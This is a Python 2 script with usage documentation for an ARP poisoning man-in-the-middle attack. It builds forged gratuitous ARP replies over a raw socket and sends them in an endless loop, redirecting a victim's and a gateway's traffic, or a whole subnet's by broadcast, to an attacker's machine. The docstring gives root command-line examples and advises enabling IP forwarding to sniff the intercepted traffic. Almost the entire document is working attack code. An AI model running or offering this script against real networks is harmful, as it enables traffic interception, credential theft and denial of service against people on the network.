'''
Custom script to launch an ARP poison attack. Uses the structures defined in /Structures/Layer2.
Refer to the documentation of the specific module concerned to understand the structure, and the order of parameters in the constructor.

This script assumes the use of three MAC address and IP addresses in the following order:
-g: gateway MAC, IP
-v: victim MAC, IP
-m: the middle machine (attacker) MAC

If -v is ignored, the destination MAC is set to broadcast, spoofing all the devices connected to the gateway. No spoofed packets are sent to the gateway. This might lead to a DoS, so be careful!!
If -m is ignored, the attacker MAC and IP is set to the currently used interface's MAC and IP. In this case, an interface must be specified.
If -g is ignored, the script failes.

Notes:
-> Requires root
-> The specified interface must be in promiscous mode to ensure no packets are lost
-> Uses Gratitious ARP replies to implement the attack. Change the ARP packet constructor if any customisation is needed.
-> IP forwarding is needed to sniff packets via ARP poisoning. You should enable it before running the attack. 

Example usage:

(Complete Usgae)
root@localhost:~# python ARPPoison.py -g a4:b7:ff:ff:ff:ff 10.10.10.0 -v b3:f4:69:ff:ff:ff 10.10.10.2 -m b3:ff:69:35:a0:9d eth0

(No -c, sends ARP packets to broadcast, sending spoofed client to gateway is ignored)
root@localhost:~# python ARPPoison.py -g a4:b7:ff:ff:ff:ff 10.10.10.0 -m b3:ff:69:35:a0:9d eth0

(No -m, takes in the MAC of current promiscous interface used to inject)
root@localhost:~# python ARPPoison.py -g a4:b7:ff:ff:ff:ff 10.10.10.0 -v b3:f4:69:ff:ff:ff 10.10.10.2 eth0
'''

import sys, socket, binascii, time
sys.path.append( <absolute path to /Structures> )
from Layer2 import ARP, EthernetFrame

#Parse and prepare command line arguments
if sys.argv[1] != '-g': 
    #Gateway not given, exit.
    print "Error: Gateway MAC and IP needed.\n"
    sys.exit(-1)
else:
    #Gateway given
    Gateway_MAC = sys.argv[2]
    Gateway_IP = sys.argv[3]
    g = True

#Checking victim
if sys.argv[4] == '-v': 
    #victim given
    Victim_MAC = sys.argv[5]
    Victim_IP = sys.argv[6]
    v = True
    if sys.argv[7] == '-m': 
        #Interface given
        Attacker_MAC = sys.argv[8]
        iface = sys.argv[9]
    else: 
        #Attacker interface not specified
        #quick code to get the mac address of given interface
        iface = sys.argv[7]
        s=socket.socket(socket.AF_PACKET,socket.SOCK_RAW)
        s.bind((iface,0))
        Attacker_MAC = binascii.hexlify(s.getsockname()[4])
        k=''
        i=0
        while i<len(Attacker_MAC):
            k+=Attacker_MAC[i]+Attacker_MAC[i+1]+':'
            i+=2
        Attacker_MAC = k[0:len(k)-1]
        del(k)
        del(i)
        del(s)
else: 
    #Victim not given, broadcast
    Victim_MAC = 'ff:ff:ff:ff:ff:ff'
    v = False
    #Check Attacker interface
    if sys.argv[4] == '-m': 
        #Interface given
        Attacker_MAC = sys.argv[5]
        iface = sys.argv[6]
    else: 
        #Attacker interface not specified
        #quick code to get the mac address of given interface
        iface = sys.argv[4]
        s=socket.socket(socket.AF_PACKET,socket.SOCK_RAW)
        s.bind((iface,0))
        Attacker_MAC = binascii.hexlify(s.getsockname()[4])
        k=''
        i=0
        while i<len(Attacker_MAC):
            k+=Attacker_MAC[i]+Attacker_MAC[i+1]+':'
            i+=2
        Attacker_MAC = k[0:len(k)-1]
        del(k)
        del(i)
        del(s)

#Prepare a raw socket to inject packets across
sock = socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.htons(0x0003))
sock.bind((iface,0))

#Victim mentioned, targeted poison
if v:
    #Prepare packets to Victim
    #Tell the victim that gateway IP belongs to attacker MAC
    EthV = EthernetFrame(Attacker_MAC, Victim_MAC, 0x0806).Frame()
    ArpV = ARP(0x0001,0x0800,0x01,Attacker_MAC,Gateway_IP,Attacker_MAC,Gateway_IP).Packet()
    packetV = EthV + ArpV
    #Prepare packets to Gateway
    #Tell the gateway that victim IP is at attacker MAC
    EthG = EthernetFrame(Attacker_MAC, Gateway_MAC, 0x0806).Frame()
    ArpG = ARP(0x0001,0x0800,0x01,Attacker_MAC,Victim_IP,Attacker_MAC,Victim_IP).Packet()
    packetG = EthG + ArpG
    #Sending out the respective packets
    while 1:
        sock.send(packetG)
        sock.send(packetV)
        time.sleep(2)

#Victim not mentioned, broadcast, unidirectional poison
else:
    #Prepare broadcast packets
    #Tell everyone at broadcast that gateway IP is at attacker MAC
    Eth = EthernetFrame(Attacker_MAC, 'ff:ff:ff:ff:ff:ff', 0x0806).Frame()
    Arp = ARP(0x0001,0x0800,0x01,Attacker_MAC,Gateway_IP,Attacker_MAC,Gateway_IP).Packet()
    packet = Eth + Arp
    #Send the packets
    while 1:
        sock.send(packet) 
        time.sleep(2)
